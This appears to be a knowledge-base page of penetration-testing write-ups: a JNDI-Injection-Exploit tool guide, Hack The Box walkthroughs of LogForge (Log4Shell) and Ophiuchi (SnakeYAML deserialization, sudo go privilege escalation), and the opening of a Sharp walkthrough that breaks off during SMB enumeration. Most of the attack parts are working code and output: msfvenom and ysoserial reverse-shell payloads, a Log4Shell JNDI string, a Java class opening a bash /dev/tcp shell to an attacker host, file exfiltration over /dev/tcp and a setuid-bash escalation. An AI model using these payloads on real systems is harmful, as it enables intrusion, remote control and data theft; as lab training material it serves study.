JNDI-injection-exploit可用于生成有效的JNDI链接，并通过启动RMI服务、LDAP服务和HTTP服务来提供后台服务。RMI服务和LDAP服务基于[marshals](https://github.com/mbechler/marshalsec)，可以进一步修改以与HTTP服务链接。

使用此工具可以获得JNDI链接，可以将这些链接插入POC以测试漏洞。

例如，下面是一个Fastjson vul-poc:

``` bash
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}
```

可以使用JNDI-Injection-Exploit生成的链接替换“rmi://127.0.0.1:1099/Object”来测试漏洞。

#### 使用

``` bash
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

-C - 在远程类文件中执行的命令。

(可选，default命令为 "open /Applications/Calculator.app")

-A - 服务器地址，IP地址或域。

(可选，默认地址为网络接口的第一个地址)

 - 确保服务器的端口(1099、1389、8180)是可用的。或者可以在run.ServerStart class第26~28行中更改默认端口。

 - 执行的命令被传到 Runtime.getRuntime().exec() 作为参数, 因此，需要确保命令在exec()中是可操作的。bash中的命令“bash -c ......”需要添加双引号.

#### 实例

1.启动工具:

``` bash
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
```

2.假设将第1步中生成的JNDI链接(如rmi://ADDRESS/jfxllc)注入到易受攻击的应用程序中，该应用程序可能会受到JNDI注入的攻击。在这个例子中，是这样的:

``` bash
public static void main(String[] args) throws Exception{
    InitialContext ctx = new InitialContext();
    ctx.lookup("rmi://127.0.0.1/fgf4fp");
}
```

然后当运行这段代码时，命令将被执行，日志将在shell中打印:

#### 安装

直接下载最新的jar

``` bash
https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

或者将源代码克隆到本地并进行构建(需要Java 1.8+ 和 Maven 3.x+)。

``` bash
$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
$ cd JNDI-Injection-Exploit
$ mvn clean package -DskipTests
```

#### 生成payload反弹shell

首先对logforge靶场环境进行探测

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j2.png)

可以看到目标使用Tomcat/9.0.31

Tomcat的默认端口是8080。猜测配置是Apache在端口80上将请求重定向到端口8080上的tomcat服务。Apache阻止直接访问/manager（这是 Tomcat 的管理面板。此配置可能会导致路径遍历问题。

 - 绕过Apache的限制

参考hacktricks的这篇文章[Tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j3.png)

以下payload可以绕过Apache阻拦配置并访问Tomcat管理面板, 输入tomcat默认弱口令tomcat/tomcat即可

``` bash
http://10.10.11.138/;param=value/manager/html
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j4.png)

首先上传一个恶意WAR文件尝试反弹shell

``` bash
┌──(root💀kali-linux-2021-1)-[~/hackthebox-tmp/logforge]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4444 -f war -o rev.war
Payload size: 1085 bytes
Final size of war file: 1085 bytes
Saved as: rev.war
```

成功上传但是返回错误

``` bash
FAIL - Deploy Upload Failed, Exception: [org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]
```

#### log4j漏洞利用

可能会注意到这个错误消息来自一个日志管理器，比如Log4j。此Java包具有执行JNDI (Java Naming and Directory Interface) lookups的特性。可能会受到CVE-2021-44228 (Log4Shell)漏洞的影响。

验证CVE-2021-44228 (Log4Shell)漏洞是否存在, payload:

``` bash
${jndi:ldap://10.10.14.30:9001/exp}
```

如下图位置放置payload

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j5.png)

成功收到请求包，log4shell存在

``` bash
┌──(root💀kali-linux-2021-1)-[~/hackthebox-tmp/logforge]
└─# nc -lvp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.138.
Ncat: Connection from 10.10.11.138:54332.
0
 `�
```

 - 使用前面介绍的ysoserial修改版生成反弹shell的payload

``` bash
┌──(root💀kali-linux-2021-1)-[~/ysoserial-modified/target]
└─# echo -n 'bash  -i >& /dev/tcp/10.10.14.30/4444 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx
┌──(root💀kali-linux-2021-1)-[~/ysoserial-modified/target]
└─# java -jar ysoserial-modified.jar CommonsCollections5 bash 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx | base64 -d | bash' > /root/hackthebox-tmp/logforge/payload.ser
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/ysoserial-modified/target/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release

┌──(root💀kali-linux-2021-1)-[~/hackthebox-tmp/logforge]
└─# cat payload.ser 
��sr.javax.management.BadAttributeValueExpException��ګc-F@LvaltLjava/lang/Object;xrjava.lang.Exception��>�;�xrjava.lang.Throwable��5'9w��LcausetLjava/lang/ThrowabdetailMessagetLjava/lang/String;[
stackTracet[Ljava/lang/StackTraceElement;LsuppressedExceptionstLjava/util/List;xpqpur[Ljava.lang.StackTraceElement;F*<<�"9xpsrava.lang.StackTraceElementa	Ś&BformatI
lineNumberLclassLoaderNameq~LdeclaringClassq~fileNameq~L
methodNameq~L
moduleVersionq~xpJtappt&ysoserial.payloads.CommonsCollections5tCommonsCollections5.javat	getObjectppsq~
q~q~q~ppsq~                                                                                                   ,q~
tysoserial.GeneratePayloadtGeneratePayload.javatmainppsrjava.util.Collections$EmptyListz��<���xpxsr4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9��Lkeyq~LmaptLjava/util/Map;xptfoosr*org.apache.commons.collections.map.LazyMapn唂�y�Lfactoryt,Lorg/apache/commons/collections/Transformer;xpsr:org.apache.commons.colleiTransformerst-[Lorg/apache/commons/collections/Transformer;xpur-[Lorg.apache.commons.collections.Transformer;�V*��4�xpsr;org.apache.commons.collections.functors.ConstantTransformerXv�A��L	iConstantq~xpvrjava.lang.Runtimexpsr:org.apache.commons.collections.functors.InvokerTransformer���k{|�8[iArgst[Ljava/lang/Object;L
                                                                                                                                                                 iMethodNameq~[
             iParamTypest[Ljava/lang/Class;xpur[Ljava.lang.Object;��X�s)lxpt
getRuntimeur[Ljava.lang.Class;�׮��Z�xpt	getMethoduq~/vrjava.lang.String��8z;�Bxpvq~/sq~(uq~,puq~,tinvokeuq~/vrjava.lang.Objectxpvq~,sq~(uq~,ur[Ljava.lang.String;��V��{Gxpt	/bin/basht-ctPecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx | base64 -d | bashtexecuq~/vq~@sq~$srjava.lang.Integer⠤���8Ivaluexrjava.lang.Number���
                ���xpsrjava.util.HashMap���`�F
loadFactorI	thresholdxp?@xx
```

 - 现在再使用前面介绍的JNDI-Exploit-Kit开启LDAP服务端

``` bash
┌──(root💀kali-linux-2021-1)-[~/JNDI-Exploit-Kit/target]
└─# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.30:1389 -P /root/hackthebox-tmp/logforge/payload.ser
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.10.14.30
[RMI_ADDR] >> 10.10.14.30
[LDAP_ADDR] >> 10.10.14.30
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.30:1099/yz36ka
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.30:1099/relqou
ldap://10.10.14.30:1389/relqou
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.30:1099/fda54l
ldap://10.10.14.30:1389/fda54l
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.30:1099/jmlhtq
ldap://10.10.14.30:1389/jmlhtq
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.14.30:1099/6lfxah
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.30:1099/o7bhyq
ldap://10.10.14.30:1389/o7bhyq

----------------------------Server Log----------------------------
2021-12-29 11:48:12 [JETTYSERVER]>> Listening on 10.10.14.30:8180
2021-12-29 11:48:12 [RMISERVER]  >> Listening on 10.10.14.30:1099
2021-12-29 11:48:12 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

选择JDK 1.8的 JNDI payload:

``` bash
${jndi:ldap://10.10.14.30:1389/o7bhyq}
```

放入payload后再点击按钮，nc可以接收到一个rev shell

``` bash
2021-12-29 11:52:27 [LDAPSERVER] >> Send LDAP object with serialized payload: ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD85020008420006666F726D617449000A6C696E654E756D6265724C000F636C6173734C6F616465724E616D6571007E00054C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E00054C000A6D6F64756C654E616D6571007E00054C000D6D6F64756C6556657273696F6E71007E00057870010000004A74000361707074002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A65637470707371007E000B010000002C71007E000D71007E000E71007E000F71007E001070707371007E000B010000003171007E000D74001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D61696E70707372001F6A6176612E7574696C2E436F6C6C656374696F6E7324456D7074794C6973747AB817B43CA79EDE020000787078737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00017870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E002F00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E002F7371007E00287571007E002C00000002707571007E002C00000000740006696E766F6B657571007E002F00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002C7371007E00287571007E002C00000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000037400092F62696E2F626173687400022D637400506563686F20596D467A614341674C576B67506959674C32526C64693930593341764D5441754D5441754D5451754D7A41764E4451304E43417750695978207C20626173653634202D64207C2062617368740004657865637571007E002F000000017671007E00407371007E0024737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878
```

``` bash
┌──(root💀kali-linux-2021-1)-[~/hackthebox-tmp/logforge]
└─# nc -lvp 4444                                                                                                                                            130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.138.
Ncat: Connection from 10.10.11.138:38750.
bash: cannot set terminal process group (787): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat@LogForge:/var/lib/tomcat9$ whoami
whoami
tomcat
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j6.png)

至此使用修改版ysoserial和JNDI-Exploit-Kit复现log4j漏洞成功。
<!-- kb:end log4j -->

</details>

<a id="case-ophiuchi"></a>

## YAML 加载与 WASM 返回值

SnakeYAML 输入触发 Java 对象加载，后续 Go 程序依赖 WASM 结果决定执行。模块分析、修改与 sudo 运行条件保留在原链。

<p class="kb-provenance">来源 Ophiuchi · 原记录 2021-02-14 · 13 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-ophiuchi">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Ophiuchi -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	13 Feb 2021
IP:	10.10.10.227

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb185.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/ophiuchi]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.227
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.38
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### get user

on port 8080 we found Online YAML Parser

after google search, we found an exploit

 - [yaml-payload](https://github.com/artsploit/yaml-payload)

download the exploit, then modify src/artsploit/AwesomeScriptEngineFactory.java to the following content

``` bash
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"};
        String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
        try {
            Runtime.getRuntime().exec(cmd);
            Runtime.getRuntime().exec(jex);
            Runtime.getRuntime().exec("echo $jex");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

compile and serve:

``` bash
javac src/artsploit/AwesomeScriptEngineFactory.java
cd src
python3 -m http.server 80
```

trigger exploit: browse to http://10.10.14.5:8080/ and enter:

``` bash
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.5/"]
  ]]
]
```

privesc from tomcat to admin:

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.227.
Ncat: Connection from 10.10.10.227:58294.
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ id
whoid
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@ophiuchi:/$ ami
whoami
tomcat
tomcat@ophiuchi:/$ cd ~
cd ~
tomcat@ophiuchi:~$ ls
ls
bin
BUILDING.txt
conf
CONTRIBUTING.md
lib
LICENSE
logs
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
temp
webapps
work
tomcat@ophiuchi:~$ cd conf
cd conf
tomcat@ophiuchi:~/conf$ ls
ls
catalina.policy
catalina.properties
context.xml
jaspic-providers.xml
jaspic-providers.xsd
logging.properties
server.xml
tomcat-users.xml
tomcat-users.xsd
web.xml
tomcat@ophiuchi:~/conf$ cat * | grep pass
cat * | grep pass
# passed to checkPackageAccess unless the
# passed to checkPackageDefinition unless the
         analyzes the HTTP headers included with the request, and passes them
      <!-- Use the LockOutRealm to prevent attempts to guess user passwords
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
            <xs:attribute name="password" type="xs:string" />
  <!--                       pass the result to this style sheet residing   -->
  <!--                       pass the result to this style sheet which is   -->
  <!--                        work-around various issues when Java passes   -->
  <!--                        headers passed to the CGI process as          -->
  <!--   passShellEnvironment Should the shell environment variables (if    -->
  <!--                        any) be passed to the CGI script? [false]     -->
        <mime-type>application/vnd.blueice.multipass</mime-type>
tomcat@ophiuchi:~/conf$ su admin
su admin
Password: whythereisalimit
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
whoami
admin
python -c 'import pty; pty.spawn("/bin/bash")'
bash: line 3: python: command not found
python3 -c 'import pty; pty.spawn("/bin/bash")'
admin@ophiuchi:/opt/tomcat/conf$ id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

then got the user flag

``` bash
admin@ophiuchi:/opt/tomcat/conf$ cd
cd
admin@ophiuchi:~$ ls
ls
user.txt
admin@ophiuchi:~$ cat user.txt
cat user.txt
4985ea2805b1c7ee8adca11a4f0b0b39
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb186.jpg)

#### get root

``` bash
┌──(root💀kali)-[~/hackthebox/machine/ophiuchi]
└─# ssh admin@10.10.10.227
The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
admin@10.10.10.227's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 14 Feb 2021 08:42:54 AM UTC

  System load:             0.0
  Usage of /:              20.4% of 27.43GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               219
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.227
  IPv6 address for ens160: dead:beef::250:56ff:feb9:1c49


176 updates can be installed immediately.
56 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 13 19:55:31 2021 from 10.10.14.17
admin@ophiuchi:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

download main.wasm:

1. start listener on your machine

``` bash
┌──(root💀kali)-[~/hackthebox/machine/ophiuchi]
└─# nc -lvnp 9002 > main.wasm
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.10.10.227.
Ncat: Connection from 10.10.10.227:55062.
```
2. send file

``` bash
admin@ophiuchi:~$ cat /opt/wasm-functions/main.wasm > /dev/tcp/10.10.14.5/9002
```

analyze file:

1. upload at https://webassembly.github.io/wabt/demo/wasm2wat/index.html

2. edit the 0 to a 1 and copy the code:
``` bash
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 1))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```
3. paste the code at https://webassembly.github.io/wabt/demo/wat2wasm/index.html

4. click on download

5. transfer the downloaded file to target to a writeable directory

6. create deploy.sh and run sudo command:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/ophiuchi]
└─# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.227 - - [14/Feb/2021 04:02:19] "GET /test.wasm HTTP/1.1" 200 -
```

``` bash
cd /tmp
echo "chmod +s /bin/bash" > deploy.sh
wget http://10.10.14.5/test.wasm main.wasm
chmod 777 *
sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
/bin/bash -p
```

and now we are root

``` bash
admin@ophiuchi:/tmp$ ls
deploy.sh          systemd-private-64051d8f15f4418cbb11018667bc15ad-systemd-logind.service-Y5t4mf     vmware-root_667-3980363901
hsperfdata_tomcat  systemd-private-64051d8f15f4418cbb11018667bc15ad-systemd-resolved.service-lBxjmi   wasm-functions
main.wasm          systemd-private-64051d8f15f4418cbb11018667bc15ad-systemd-timesyncd.service-RVvCVh
admin@ophiuchi:/tmp$ sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

admin@ophiuchi:/tmp$ /bin/bash -p
bash-5.0# id
uid=1000(admin) gid=1000(admin) euid=0(root) egid=0(root) groups=0(root),1000(admin)
bash-5.0# whoami
root
bash-5.0# cd
bash-5.0# ls
user.txt
bash-5.0# cd /root
bash-5.0# ls
go  root.txt  snap
bash-5.0# cat root.txt
5296450d942ebf2bd9763b2431f7f1d5
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb187.jpg)


#### Summary of knowledge

 - modify yaml-payload to get a reverse shell
 - tomcat password leak
 - .wasm file analyse and modify
 - privesc through NOPASSWD /usr/bin/go

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end Ophiuchi -->

</details>

<a id="case-sharp"></a>

## 应用配置、.NET Remoting 与 WCF

Kanban 配置中的账户状态连接到 .NET 远程服务；dnSpy、ysoserial.net 与特权 WCF 服务的原有执行分支全部保留。

<p class="kb-provenance">来源 sharp · 原记录 2021-01-08 · 26 个代码块 · 20 处图片引用</p>

<details class="kb-evidence" id="record-sharp">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start sharp -->

#### introduce

OS: Windows
Difficulty: Hard
Points:	40
Release:	05 Dec 2020
IP:	10.10.10.219

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb136.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.219
PORT     STATE SERVICE         VERSION
135/tcp  open  tcpwrapped
139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8888/tcp open  sun-answerbook?
8889/tcp open  ddi-tcp-2?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Enumeration

SMB on 149 and 445 is a good first port of call.

#### SMB enum

first run smbmap -H 10.10.10.219 which shows us the directories in the SMB share, and also the permissions that we do or do not have access to.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# smbmap -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
```

The kaban directory is accessible to us. We can take a note of this name too, as it may be a username for later on. We can also use smbmap with the -R flag to list out all the files and directories inside of the shares that we have access to:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# smbmap -H 10.10.10.219 -R
[+] IP: 10.10.10.219:445        Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
        .\kanban\*
        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .
        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..
        fr--r--r--            58368 Sat Nov 14 13:57:04 2020    CommandLine.dll
        fr--r--r--           141312 Sat Nov 14 13:57:04 2020    CsvHelper.dll
        fr--r--r--           456704 Sat Nov 14 13:57:04 2020    DotNetZip.dll
        dr--r--r--                0 Sat Nov 14 13:57:59 2020    Files
        fr--r--r--            23040 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Converter.Html.dll
        fr--r--r--            75776 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Interpreter.dll
        fr--r--r--            32768 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Parser.dll
        fr--r--r--            19968 Sat Nov 14 13:57:04 2020    Itenso.Sys.dll
        fr--r--r--           376832 Sat Nov 14 13:57:04 2020    MsgReader.dll
        fr--r--r--           133296 Sat Nov 14 13:57:04 2020    Ookii.Dialogs.dll
        fr--r--r--          2558011 Sat Nov 14 13:57:04 2020    pkb.zip
        dr--r--r--                0 Sat Nov 14 13:57:04 2020    Plugins
        fr--r--r--             5819 Sat Nov 14 13:57:04 2020    PortableKanban.cfg
        fr--r--r--           118184 Sat Nov 14 13:57:04 2020    PortableKanban.Data.dll
        fr--r--r--          1878440 Sat Nov 14 13:57:04 2020    PortableKanban.exe
        fr--r--r--            31144 Sat Nov 14 13:57:04 2020    PortableKanban.Extensions.dll
        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3
        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.bak
        fr--r--r--               34 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.md5
        fr--r--r--           413184 Sat Nov 14 13:57:04 2020    ServiceStack.Common.dll
        fr--r--r--           137216 Sat Nov 14 13:57:04 2020    ServiceStack.Interfaces.dll
